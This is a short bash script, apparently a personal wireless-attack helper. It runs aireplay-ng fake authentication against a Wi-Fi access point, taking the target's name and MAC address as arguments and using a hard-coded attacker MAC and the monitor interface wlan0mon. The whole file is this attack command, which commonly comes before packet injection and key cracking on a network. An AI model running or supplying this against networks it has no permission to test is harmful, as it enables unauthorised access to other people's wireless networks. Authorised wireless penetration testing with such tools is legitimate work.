#!/usr/bin/env bash
#666

#ap name
#apname="teddy"
apname="$1"

#ap mac
#apmac="28:BD:89:CE:36:7E"
apmac="$2"

#our mac
ourmac="90:61:ae:75:fb:cf"

#our nic
ourdev="wlan0mon"

aireplay-ng -1 0 -e $apname -a $apmac -h $ourmac $ourdev
